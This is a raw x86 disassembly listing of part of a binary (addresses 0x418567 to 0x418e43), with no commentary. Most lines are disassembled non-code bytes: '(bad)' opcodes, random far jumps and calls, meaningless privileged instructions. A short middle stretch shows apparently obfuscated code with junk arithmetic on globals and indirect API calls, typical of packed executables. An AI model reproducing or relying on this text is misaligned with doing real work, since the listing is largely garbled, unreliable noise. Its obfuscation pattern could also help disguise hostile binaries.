  418567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418568:	nop
  418569:	and    ebp,edx
  41856b:	mov    ch,0xdc
  41856d:	xchg   edi,eax
  41856f:	aad    0x70
  418571:	mov    bl,0xb5
  418573:	inc    eax
  418574:	retf   0x7cdd
  418577:	adc    eax,0x79a22ece
  41857c:	popa   
  41857d:	or     al,0x97
  41857f:	fdiv   QWORD PTR [ebp-0x5956fd47]
  418585:	daa    
  418586:	(bad)  
  418587:	adc    cl,al
  418589:	stos   BYTE PTR es:[edi],al
  41858a:	loopne 0x418530
  41858c:	push   ds
  41858d:	mov    ch,0x52
  41858f:	ffree  st(7)
  418591:	call   0xd49f:0xb00b58c2
  418598:	add    eax,DWORD PTR [edx]
  41859a:	es sbb eax,0x28386767
  4185a0:	nop
  4185a1:	pop    ebx
  4185a2:	mov    edx,gs
  4185a4:	add    cl,BYTE PTR [ebx]
  4185a6:	push   ebp
  4185a7:	ds jae 0x4185ad
  4185aa:	mov    cl,0xdd
  4185ac:	sbb    ch,BYTE PTR [esi-0x2bae99b8]
  4185b2:	pop    edi
  4185b3:	mov    al,ds:0xef8ef4ae
  4185b8:	jo     0x41860b
  4185ba:	adc    cl,dl
  4185bc:	sahf   
  4185bd:	popa   
  4185be:	sti    
  4185bf:	xchg   edx,eax
  4185c0:	ins    DWORD PTR es:[edi],dx
  4185c1:	arpl   WORD PTR [ebp-0x7c],ax
  4185c4:	and    dh,0x3e
  4185c7:	sub    BYTE PTR [ebx+0x76],cl
  4185ca:	mov    edi,0x9a64cac0
  4185cf:	mov    ch,BYTE PTR [ebx]
  4185d1:	addr16 add eax,0xfa421359
  4185d7:	lahf   
  4185d8:	cld    
  4185d9:	clc    
  4185da:	jns    0x418600
  4185dc:	sub    BYTE PTR [eax],dh
  4185de:	mov    ebp,0x2734fad0
  4185e3:	dec    ebx
  4185e4:	cmp    dl,ch
  4185e6:	outs   dx,DWORD PTR ds:[esi]
  4185e7:	inc    esi
  4185e8:	push   ebp
  4185e9:	stos   BYTE PTR es:[edi],al
  4185ea:	out    0x2f,al
  4185ec:	jecxz  0x4185a8
  4185ee:	fisttp WORD PTR [eax+ebp*2+0x197564b2]
  4185f5:	iret   
  4185f6:	mov    edi,0x7531d691
  4185fb:	in     al,dx
  4185fc:	sub    al,cl
  4185fe:	lods   al,BYTE PTR ds:[esi]
  4185ff:	popw   ds
  418601:	jecxz  0x41861b
  418603:	clc    
  418604:	rcr    DWORD PTR [edi-0x42],cl
  418607:	mov    eax,0xdd2a0248
  41860c:	jo     0x4185cd
  41860e:	cmp    BYTE PTR [edx],bh
  418610:	out    dx,eax
  418611:	mov    esp,0xae6d172d
  418616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418617:	repz imul esi,DWORD PTR [ecx-0x1625c7d5],0x43db9aa8
  418622:	jnp    0x4185e1
  418624:	popf   
  418625:	das    
  418626:	mov    BYTE PTR [ebp-0x793c520d],0x4b
  41862d:	aaa    
  41862e:	xchg   ebp,eax
  41862f:	inc    ebp
  418630:	xchg   bl,ah
  418632:	push   eax
  418633:	(bad)  
  418635:	add    ebx,DWORD PTR [ebx+esi*8-0x2d]
  418639:	mov    al,0x5b
  41863b:	jg     0x418697
  41863d:	hlt    
  41863e:	inc    esp
  41863f:	mov    ?,WORD PTR [edi-0x58]
  418642:	push   0xffffffff
  418644:	push   esp
  418645:	inc    DWORD PTR [ecx+edx*8]
  418648:	jle    0x4186bc
  41864a:	dec    edi
  41864b:	jp     0x4186be
  41864d:	xor    eax,0x630c87db
  418652:	mov    ah,0x73
  418654:	repz adc eax,0x9bf3480b
  41865a:	nop
  41865b:	cld    
  41865c:	or     eax,0xf2c9ba8f
  418661:	dec    edx
  418662:	mov    edx,0x23207fc7
  418667:	jmp    0xddbadd0e
  41866c:	imul   ecx,DWORD PTR [esi*1-0x1565474d],0xffffffa9
  418674:	lds    edi,FWORD PTR [ebp-0x6c4bb530]
  41867a:	and    bh,BYTE PTR [ebp-0x3e]
  41867d:	and    al,dl
  41867f:	sbb    BYTE PTR [edx-0x3b0e5be2],dh
  418685:	pop    ecx
  418686:	gs pushw 0xf6e1
  41868b:	jp     0x4186ea
  41868d:	mov    edx,0x2ddbe549
  418692:	sbb    bh,bl
  418694:	cli    
  418695:	fwait
  418696:	push   ecx
  418697:	test   eax,0xa215f3ea
  41869c:	xchg   edi,eax
  41869d:	cli    
  41869e:	ins    BYTE PTR es:[edi],dx
  41869f:	popf   
  4186a0:	adc    dh,dh
  4186a2:	sbb    BYTE PTR [ebp+0x34a3ad91],0x81
  4186a9:	mov    eax,0x95c810c5
  4186ae:	out    0x1e,al
  4186b0:	and    eax,0x7ddaf13a
  4186b5:	aas    
  4186b6:	jle    0x4186f9
  4186b8:	push   edi
  4186b9:	cs cwde 
  4186bb:	xor    ch,BYTE PTR [ecx]
  4186bd:	xchg   edx,eax
  4186be:	dec    ebx
  4186bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c0:	mov    al,0xa
  4186c2:	adc    BYTE PTR [ebp+0x36],0x9b
  4186c6:	aas    
  4186c7:	xchg   esi,eax
  4186c8:	fild   WORD PTR [edx-0x18]
  4186cb:	in     eax,0xe7
  4186cd:	push   ds
  4186ce:	push   0x78038379
  4186d3:	add    DWORD PTR [edi+0x52],edi
  4186d6:	aaa    
  4186d7:	cld    
  4186d8:	inc    edx
  4186d9:	cmp    ebx,DWORD PTR [edi-0x1e4e561c]
  4186df:	rol    BYTE PTR [esi-0x5e],cl
  4186e2:	mov    al,0x7f
  4186e4:	inc    esp
  4186e5:	inc    esi
  4186e6:	adc    BYTE PTR [ebx*8-0x2e4a940c],bh
  4186ed:	xchg   edi,eax
  4186ee:	sub    DWORD PTR ds:0x6b335f71,ebp
  4186f4:	sub    DWORD PTR [eax-0x5eb4032a],ebp
  4186fa:	popa   
  4186fb:	push   ss
  4186fc:	mov    DWORD PTR [ebx+esi*8+0x2dfaca7c],esp
  418703:	lods   eax,DWORD PTR ds:[esi]
  418704:	mov    al,ds:0x4de75567
  418709:	or     DWORD PTR [edi],edx
  41870b:	or     BYTE PTR [edx-0x3a390962],cl
  418711:	je     0x418779
  418713:	push   0xd041d020
  418718:	adc    DWORD PTR [edi-0x33],ebx
  41871b:	pop    edx
  41871c:	or     BYTE PTR [esi-0x353ddd42],dh
  418722:	xor    al,ah
  418724:	mov    cl,0x8
  418726:	outs   dx,BYTE PTR ds:[esi]
  418727:	retf   
  418728:	jmp    0x3c6e:0xe2a3edb
  41872f:	adc    DWORD PTR [ebx+edx*4-0x10],ecx
  418733:	and    dl,BYTE PTR [edi+0x4d33ac6a]
  418739:	ja     0x41878b
  41873b:	pushf  
  41873c:	push   eax
  41873d:	stos   BYTE PTR es:[edi],al
  41873e:	call   0xc364:0x34531e9e
  418745:	mov    al,0x2d
  418747:	imul   edx,DWORD PTR [edi],0x5d
  41874a:	mov    esi,0x506edd71
  41874f:	add    BYTE PTR [edx-0x27],bh
  418752:	(bad)  
  418754:	dec    esi
  418755:	sub    eax,0x176d9792
  41875a:	ss sub al,0x1a
  41875d:	sbb    BYTE PTR [edx+0x29],bh
  418760:	inc    esi
  418761:	mov    bl,BYTE PTR [edi]
  418763:	pop    eax
  418764:	jns    0x41872b
  418766:	mov    edx,0x3cf4596e
  41876b:	sub    dl,BYTE PTR [ecx+0x2d]
  41876e:	jmp    0x73e7:0xbb9e8f33
  418775:	dec    ecx
  418776:	mov    dh,0xdb
  418778:	mov    ebx,0x2642786a
  41877d:	sub    esi,esi
  41877f:	bound  esp,QWORD PTR [ebp+0x882e1af]
  418785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418786:	cmc    
  418787:	test   al,0xad
  418789:	pop    eax
  41878a:	in     eax,dx
  41878b:	cmp    dl,BYTE PTR [eax-0x31ff2298]
  418791:	jmp    0x41871d
  418793:	inc    esi
  418794:	stos   BYTE PTR es:[edi],al
  418795:	rol    bl,0x1e
  418798:	stos   BYTE PTR es:[edi],al
  418799:	dec    esi
  41879a:	mov    DWORD PTR [edi+eiz*1],edx
  41879d:	mov    edi,0x57c46d49
  4187a2:	jae    0x41881f
  4187a4:	pop    ecx
  4187a5:	jp     0x418748
  4187a7:	jnp    0x418810
  4187a9:	add    al,dh
  4187ab:	jl     0x4187a4
  4187ad:	mov    ah,0x2
  4187af:	clc    
  4187b0:	pop    ds
  4187b1:	sbb    eax,0xa330abf1
  4187b6:	outs   dx,BYTE PTR ds:[esi]
  4187b7:	xchg   edi,eax
  4187b8:	std    
  4187b9:	outs   dx,DWORD PTR ds:[esi]
  4187ba:	pop    esp
  4187bb:	lods   eax,DWORD PTR ds:[esi]
  4187bc:	mov    edx,0x16277570
  4187c1:	outs   dx,BYTE PTR ds:[esi]
  4187c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187c3:	sub    bh,BYTE PTR [esi+0x31]
  4187c6:	push   edx
  4187c7:	sbb    DWORD PTR [ebp+0x1909985c],ecx
  4187cd:	lods   eax,DWORD PTR ds:[esi]
  4187ce:	sub    ebx,DWORD PTR [edx+0x679042fa]
  4187d4:	bound  edi,QWORD PTR [esi-0x72106361]
  4187da:	mov    al,0x3a
  4187dc:	jmp    0x76cdfd27
  4187e1:	pop    ss
  4187e2:	jne    0x41877d
  4187e4:	stos   BYTE PTR es:[edi],al
  4187e5:	idiv   BYTE PTR [esi]
  4187e7:	mov    edi,0xb4a7137f
  4187ec:	jbe    0x418802
  4187ee:	inc    esp
  4187f0:	xchg   ecx,eax
  4187f1:	stc    
  4187f2:	lds    ebx,FWORD PTR [eax+ebx*2]
  4187f5:	add    BYTE PTR [ebp-0x12],0x6e
  4187f9:	sub    esi,esi
  4187fb:	mov    al,0xd0
  4187fd:	mov    edi,0x75d9b297
  418802:	xchg   esp,eax
  418803:	inc    eax
  418804:	dec    ebp
  418805:	jg     0x418868
  418807:	jno    0x418856
  418809:	std    
  41880a:	add    BYTE PTR [ecx-0x327dedf9],dl
  418810:	sbb    bh,BYTE PTR [edx+0x26]
  418813:	add    al,0xe
  418815:	and    DWORD PTR [eax+0x36],esi
  418818:	mov    bh,0x3e
  41881a:	dec    esp
  41881b:	data16 mov fs,WORD PTR [edx+edx*2+0x7d7a0566]
  418823:	cs sahf 
  418825:	in     eax,dx
  418826:	in     al,0x19
  418828:	(bad)  
  418829:	sbb    BYTE PTR [ebx-0x30],cl
  41882c:	mov    dl,0x2
  41882e:	hlt    
  41882f:	fidiv  DWORD PTR [ebp-0x50]
  418832:	(bad)
  418836:	jecxz  0x418866
  418838:	sbb    ebx,DWORD PTR [edi]
  41883a:	mov    dl,0x62
  41883c:	rol    DWORD PTR [esi-0x2b],0x64
  418840:	(bad)  
  418841:	push   esi
  418842:	xor    bh,BYTE PTR [esi+0x71060a6b]
  418848:	cmp    al,0x69
  41884a:	sbb    edx,DWORD PTR [esi-0x13fcadb8]
  418850:	mov    esi,0x781e3911
  418855:	mov    cl,0x8f
  418857:	xchg   BYTE PTR [ecx-0x38b05915],ah
  41885d:	and    eax,0x3347a98a
  418862:	(bad)  
  418863:	out    dx,eax
  418864:	cwde   
  418865:	sti    
  418866:	adc    al,0xb4
  418868:	or     dh,bl
  41886a:	jle    0x41884f
  41886c:	push   0x1dccc1f0
  418871:	sub    BYTE PTR [ebx],ah
  418873:	add    bl,dh
  418875:	scas   eax,DWORD PTR es:[edi]
  418876:	sub    al,0xd
  418878:	add    eax,0x8ed8b0a2
  41887d:	fnstenv [esi+edi*2]
  418880:	rol    BYTE PTR [ecx-0x2b433453],0xf5
  418887:	xchg   edx,eax
  418888:	mov    ebp,0x9bbbf216
  41888d:	ins    BYTE PTR es:[edi],dx
  41888e:	outs   dx,BYTE PTR ds:[esi]
  41888f:	mov    al,0xe1
  418891:	mov    ebp,0x5e641882
  418896:	or     BYTE PTR [edx-0x2e],dh
  418899:	adc    DWORD PTR [esp+edi*8+0x14],ecx
  41889d:	fdiv   DWORD PTR [ecx+0x3c]
  4188a0:	dec    edx
  4188a1:	dec    ebx
  4188a2:	push   ss
  4188a3:	call   0x786b:0xac7026c1
  4188aa:	(bad)  
  4188ab:	jmp    0xc68e:0x2176832e
  4188b2:	mov    ebp,fs
  4188b4:	retf   
  4188b5:	mov    ecx,DWORD PTR [esp+0x48]
  4188b9:	or     DWORD PTR ds:0x4281fb,0x4281eb
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428113
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428203,0x42825b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42814f,0x428253
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x4281ff,0x42833f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42823b,0x7154
  418909:	call   DWORD PTR ds:0x428d68
  41890f:	or     DWORD PTR ds:0x428253,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428357,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x4282df,0x0
  418935:	mov    DWORD PTR ds:0x4282bf,ebx
  41893b:	mov    DWORD PTR ds:0x428243,ebx
  418941:	mov    esi,DWORD PTR ds:0x428213
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x4282df,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dac
  41896e:	movzx  esi,WORD PTR ds:0x4282e3
  418975:	sbb    DWORD PTR ds:0x428123,esi
  41897b:	adc    DWORD PTR ds:0x42832f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428367,ebx
  41898b:	mov    esi,DWORD PTR ds:0x4281f7
  418991:	xor    esi,DWORD PTR ds:0x428133
  418997:	mov    DWORD PTR ds:0x4281f7,esi
  41899d:	add    DWORD PTR ds:0x428207,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428363,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42833b,0x4281fb
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428123,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x4282db,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428263
  4189ec:	mov    edx,DWORD PTR ds:0x4281eb
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428363,0x606f
  418a03:	mov    DWORD PTR ds:0x42813f,ebx
  418a09:	cmp    DWORD PTR ds:0x4282db,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428db0
  418a1c:	adc    DWORD PTR ds:0x42811b,ebx
  418a22:	or     DWORD PTR ds:0x42821f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281cf
  418a34:	mov    edx,DWORD PTR ds:0x4282f3
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x4282e3
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428267,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428363,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42823b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428357,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42811b
  418a85:	mov    eax,ds:0x42825b
  418a8a:	cmp    DWORD PTR ds:0x428363,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e50
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428333,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428243,edi
  418ac0:	or     DWORD PTR ds:0x42823b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42832f,ebx
  418ad0:	mov    eax,ds:0x422518
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42813b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xb6b0b184
  418af3:	shr    BYTE PTR [edi+0x16cb9ab0],1
  418af9:	sbb    BYTE PTR [edx+edx*1+0x491818],bh
  418b00:	js     0x418b33
  418b02:	pop    esp
  418b03:	inc    edi
  418b04:	jnp    0x418a8d
  418b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b07:	xchg   esp,eax
  418b08:	in     eax,dx
  418b09:	lods   al,BYTE PTR ds:[esi]
  418b0a:	or     ax,WORD PTR [ecx+0x2f603905]
  418b11:	add    ebp,ecx
  418b13:	and    al,0x9f
  418b15:	push   ebp
  418b16:	retf   0x76f1
  418b19:	pop    es
  418b1a:	inc    esp
  418b1b:	loope  0x418b61
  418b1d:	jo     0x418b70
  418b1f:	jae    0x418ac7
  418b21:	pop    esi
  418b22:	push   es
  418b23:	arpl   WORD PTR cs:[ebx+eiz*4-0xd],sp
  418b28:	stos   BYTE PTR es:[edi],al
  418b29:	repnz nop
  418b2b:	les    eax,FWORD PTR [eax-0x2cbf82ab]
  418b31:	std    
  418b32:	sub    edx,0x8d9ba5ea
  418b38:	aas    
  418b39:	fstp   st(7)
  418b3b:	sti    
  418b3c:	(bad)  
  418b3e:	jmp    0x192e:0xba026e23
  418b45:	add    edx,DWORD PTR [ebx+0x64]
  418b48:	ja     0x418aed
  418b4a:	inc    edi
  418b4b:	or     DWORD PTR [ecx],ebp
  418b4d:	xlat   BYTE PTR ds:[ebx]
  418b4e:	pop    ebp
  418b4f:	mov    dl,0x3a
  418b51:	fsub   DWORD PTR [ecx+0x21]
  418b54:	jno    0x418bb8
  418b56:	into   
  418b57:	or     DWORD PTR [ecx-0x4f],ebx
  418b5a:	popf   
  418b5b:	in     eax,0xd5
  418b5d:	in     eax,0xe7
  418b5f:	(bad)  
  418b60:	int3   
  418b61:	imul   ecx,eax,0x2e046e92
  418b67:	dec    edi
  418b68:	hlt    
  418b69:	ins    BYTE PTR es:[edi],dx
  418b6a:	popf   
  418b6b:	mov    cl,0x89
  418b6d:	push   cs
  418b6e:	clc    
  418b6f:	dec    edi
  418b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b71:	cwde   
  418b72:	pop    ebx
  418b73:	sub    edi,DWORD PTR [ecx-0x10]
  418b76:	dec    esi
  418b77:	ret    0x25c9
  418b7a:	dec    esp
  418b7b:	repz push ebp
  418b7d:	cmp    ebx,DWORD PTR [eax]
  418b7f:	test   eax,0x8cb18f2f
  418b84:	jbe    0x418b41
  418b86:	mov    cl,0xad
  418b88:	adc    BYTE PTR [ebx+0x7ffa222],cl
  418b8e:	mov    esi,0xcd854aa9
  418b93:	(bad)  [esi-0x35727abb]
  418b99:	mov    ecx,0x79729ca5
  418b9e:	mov    BYTE PTR [esi+eiz*8+0x7b7cae31],ah
  418ba5:	inc    esp
  418ba6:	imul   eax,DWORD PTR [ecx+edx*4+0x74],0xca10db83
  418bae:	dec    edx
  418baf:	add    bh,BYTE PTR [eax-0x45]
  418bb2:	adc    al,0x4c
  418bb4:	push   ds
  418bb5:	outs   dx,BYTE PTR ds:[esi]
  418bb6:	or     eax,0x33682779
  418bbb:	inc    ebx
  418bbc:	imul   eax,DWORD PTR [ecx],0x1e
  418bbf:	adc    ebx,edi
  418bc1:	mov    WORD PTR [edx],?
  418bc3:	add    BYTE PTR ds:0xc05ede68,0xa3
  418bca:	add    dh,al
  418bcc:	jnp    0x418b77
  418bce:	xchg   ch,dl
  418bd0:	aam    0xfc
  418bd2:	aas    
  418bd3:	sub    BYTE PTR [edx-0x285d9f61],0xe9
  418bda:	fdiv   DWORD PTR [ebx+0xd85901]
  418be0:	pop    ds
  418be1:	lock ror BYTE PTR [ecx-0x49],0xb7
  418be6:	add    BYTE PTR [edi-0x19],ah
  418be9:	js     0x418b80
  418beb:	cmp    BYTE PTR [ebx],cl
  418bed:	jle    0x418c12
  418bef:	ss or  al,0x37
  418bf2:	aas    
  418bf3:	or     BYTE PTR [esi-0x3a5bf8cb],ah
  418bf9:	stc    
  418bfa:	mov    al,ds:0x17f6a2d5
  418bff:	jl     0x418c03
  418c01:	push   0xe6e6e7c
  418c06:	lahf   
  418c07:	int3   
  418c08:	push   0x5a673dd2
  418c0d:	inc    edi
  418c0e:	add    bl,BYTE PTR [ebx+0x3d88d400]
  418c14:	in     eax,0xab
  418c16:	stos   BYTE PTR es:[edi],al
  418c17:	push   cs
  418c18:	add    bl,bh
  418c1a:	add    cl,BYTE PTR [ecx]
  418c1c:	inc    esp
  418c1d:	push   ss
  418c1e:	loope  0x418bf1
  418c20:	cmc    
  418c21:	push   esi
  418c22:	jmp    0x8636:0x5eaa33a2
  418c29:	xchg   ebp,eax
  418c2a:	push   ds
  418c2b:	push   0x15
  418c2d:	xor    eax,0x116e2f0f
  418c32:	mov    dh,0x66
  418c34:	add    bl,al
  418c36:	out    dx,al
  418c37:	xchg   ebx,eax
  418c38:	mov    gs,edi
  418c3a:	rol    BYTE PTR [edx],1
  418c3c:	or     dh,BYTE PTR [edx+0x70]
  418c3f:	stos   BYTE PTR es:[edi],al
  418c40:	cmp    eax,0xdfc1e182
  418c45:	out    0x4b,al
  418c47:	fwait
  418c48:	shr    DWORD PTR [edi],cl
  418c4a:	adc    eax,edx
  418c4c:	retf   0xd89f
  418c4f:	xor    ch,bl
  418c51:	test   eax,0x40bcd7c3
  418c56:	aad    0x18
  418c58:	inc    ebx
  418c59:	pop    esp
  418c5a:	inc    ebp
  418c5b:	inc    edx
  418c5c:	xchg   ebx,eax
  418c5d:	or     DWORD PTR [ecx],ebp
  418c5f:	or     esp,DWORD PTR [ebx]
  418c61:	dec    edi
  418c62:	aaa    
  418c63:	push   esp
  418c64:	pop    eax
  418c65:	js     0x418bee
  418c67:	aam    0xc3
  418c69:	dec    esp
  418c6a:	and    cl,al
  418c6c:	iret   
  418c6d:	sbb    BYTE PTR [ecx-0x5b],0x74
  418c71:	push   0x7d
  418c73:	lds    esp,FWORD PTR [ecx+ebx*4]
  418c76:	test   al,0x27
  418c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c79:	test   eax,0xa62e1b86
  418c7e:	cmc    
  418c7f:	bound  edi,QWORD PTR [eax]
  418c81:	dec    ebp
  418c82:	shl    ebp,0xd4
  418c85:	and    esp,esi
  418c87:	and    bh,BYTE PTR [edx-0xc]
  418c8a:	fwait
  418c8b:	push   ss
  418c8c:	and    ch,BYTE PTR [eax+0x6e]
  418c8f:	rcr    edx,1
  418c91:	mov    esi,0xee72a792
  418c96:	rcl    al,0xce
  418c99:	push   ebp
  418c9a:	push   edi
  418c9b:	ficomp WORD PTR [edi]
  418c9d:	and    bl,BYTE PTR [edi]
  418c9f:	push   ds
  418ca0:	mov    eax,ds:0x1db93f24
  418ca5:	mov    edx,0x7dfa455e
  418caa:	(bad)
  418cae:	aam    0x9e
  418cb0:	adc    esp,esp
  418cb2:	jnp    0x418cdd
  418cb4:	adc    ch,BYTE PTR [ebx]
  418cb6:	stos   DWORD PTR es:[edi],eax
  418cb7:	adc    eax,DWORD PTR [esi-0x4d5eb0d6]
  418cbd:	fiadd  DWORD PTR [edx]
  418cbf:	aad    0xab
  418cc1:	xchg   esp,eax
  418cc2:	(bad)  
  418cc3:	xchg   edi,eax
  418cc4:	ins    BYTE PTR es:[edi],dx
  418cc5:	pusha  
  418cc6:	in     eax,dx
  418cc7:	lock pop edi
  418cc9:	sbb    dh,dh
  418ccb:	jo     0x418ccf
  418ccd:	mov    ebx,0x58e61df1
  418cd2:	or     al,BYTE PTR [esi-0x6d]
  418cd5:	fisttp WORD PTR [esi-0x6c8ff61b]
  418cdb:	push   eax
  418cdc:	imul   edx,DWORD PTR [esi+0x5],0x29
  418ce0:	fwait
  418ce1:	pop    ds
  418ce2:	aaa    
  418ce3:	push   0x3e
  418ce5:	pop    edx
  418ce6:	adc    DWORD PTR [esi-0x6b491049],0xe36f6dd4
  418cf0:	xor    BYTE PTR [ecx+0x36],dh
  418cf3:	mov    esp,0x7eecfbcb
  418cf8:	(bad)  
  418cf9:	das    
  418cfa:	retf   0xa234
  418cfd:	imul   ebp,DWORD PTR [esi+ebx*2+0x65eedd7b],0x13e2d369
  418d08:	xchg   ecx,eax
  418d09:	push   edx
  418d0a:	or     al,0xf6
  418d0c:	mov    dh,0x4
  418d0e:	pop    ds
  418d0f:	and    edx,ecx
  418d11:	sbb    BYTE PTR [ebx+0x1f083ff9],dh
  418d17:	push   eax
  418d18:	mov    ch,0x95
  418d1a:	inc    esi
  418d1b:	adc    DWORD PTR [ebx],edx
  418d1d:	iret   
  418d1e:	jl     0x418d2e
  418d20:	mul    BYTE PTR [edi-0x6e3e9b8f]
  418d26:	mov    ebx,0xdc399095
  418d2b:	out    0xc9,eax
  418d2d:	sub    eax,DWORD PTR [edx]
  418d2f:	ficom  DWORD PTR [eax]
  418d31:	(bad)  
  418d32:	imul   edi,eax,0x61
  418d35:	adc    al,0xc4
  418d37:	mul    dh
  418d39:	pusha  
  418d3a:	clc    
  418d3b:	outs   dx,DWORD PTR ds:[esi]
  418d3c:	lea    eax,[esi+ecx*8-0x4d3f267b]
  418d43:	sbb    al,0x9
  418d45:	jne    0x418ce8
  418d47:	push   cs
  418d48:	mov    ds:0x1a958863,eax
  418d4d:	mov    ch,0x32
  418d4f:	aam    0x75
  418d51:	fmul   QWORD PTR [edx+0x41]
  418d54:	and    BYTE PTR [ebp-0x231dfa92],bl
  418d5a:	mov    ?,WORD PTR [eax-0x6a]
  418d5d:	ror    BYTE PTR [edx],1
  418d5f:	mov    bh,0xad
  418d61:	das    
  418d62:	or     BYTE PTR [ebx+0x52],dl
  418d65:	leave  
  418d66:	repz pop ebp
  418d68:	adc    esp,ecx
  418d6a:	mov    eax,0x3973a34d
  418d6f:	sti    
  418d70:	jns    0x418d42
  418d72:	les    ebx,FWORD PTR [esi]
  418d74:	push   ebx
  418d75:	imul   esi,DWORD PTR [esi-0x4d1a689f],0x7d30df65
  418d7f:	fsubr  QWORD PTR [edx]
  418d81:	repz dec eax
  418d83:	pop    ebp
  418d84:	mov    ebp,0xef2b4ee0
  418d89:	adc    eax,0x5da15970
  418d8e:	jl     0x418d6a
  418d90:	repz repz pushf 
  418d93:	push   edi
  418d94:	popf   
  418d95:	sbb    edi,DWORD PTR [edi+0x4b3ed60b]
  418d9b:	mov    eax,ds:0x54d8750f
  418da0:	mov    DWORD PTR [edx+0x64],esi
  418da3:	fcomp  DWORD PTR [edx]
  418da5:	stos   BYTE PTR es:[edi],al
  418da6:	(bad)  
  418da7:	jle    0x418da2
  418da9:	mov    ah,0x2a
  418dab:	imul   esp,DWORD PTR [esi+0x6d],0xffffffb4
  418daf:	fimul  WORD PTR [ebp-0x2ac3f81e]
  418db5:	call   DWORD PTR [edi+0x1d44b8c4]
  418dbb:	(bad)  
  418dbc:	loope  0x418d98
  418dbe:	sbb    al,0xf2
  418dc0:	sub    eax,0xd0ffe5ce
  418dc5:	sbb    BYTE PTR [edi],ah
  418dc7:	jns    0x418dfa
  418dc9:	mov    ds:0x2b5922a4,eax
  418dce:	jp     0x418d78
  418dd0:	aas    
  418dd1:	xor    ah,ah
  418dd3:	stc    
  418dd4:	jb     0x418dfc
  418dd6:	inc    ebx
  418dd7:	mov    esi,0xdde969ad
  418ddd:	mov    eax,ds:0xf32b3486
  418de2:	cmc    
  418de3:	in     al,0x5
  418de5:	retf   
  418de6:	pop    ds
  418de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de8:	lock lea ebx,[edx+0x20]
  418dec:	cwde   
  418ded:	inc    ecx
  418dee:	cs or  ecx,edi
  418df1:	aad    0x65
  418df3:	push   esp
  418df4:	sti    
  418df5:	leave  
  418df6:	shl    esi,0x98
  418df9:	jle    0x418e03
  418dfb:	dec    esi
  418dfc:	imul   esp,ebx,0xfffffff3
  418dff:	loopne 0x418e0e
  418e01:	sub    eax,0x893e1987
  418e06:	jecxz  0x418dea
  418e08:	pop    esp
  418e09:	or     eax,0xb79ba9e4
  418e0e:	cs mov cl,0x79
  418e11:	mov    ecx,0x1637ca41
  418e16:	cld    
  418e17:	call   0x2cfd:0x39d5b595
  418e1e:	mov    ds:0x4abf13ad,al
  418e23:	dec    edi
  418e24:	xchg   edi,eax
  418e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e26:	test   eax,0xd540ac22
  418e2b:	inc    esp
  418e2c:	int3   
  418e2d:	xchg   edi,eax
  418e2e:	xchg   ebp,eax
  418e2f:	outs   dx,DWORD PTR ds:[esi]
  418e30:	test   eax,0x82740120
  418e35:	inc    edx
  418e36:	mov    eax,ds:0x93b92911
  418e3b:	fild   QWORD PTR [edi+0x4d9ceb75]
  418e41:	cmp    ebx,DWORD PTR [edi]
  418e43:	ds cmc 
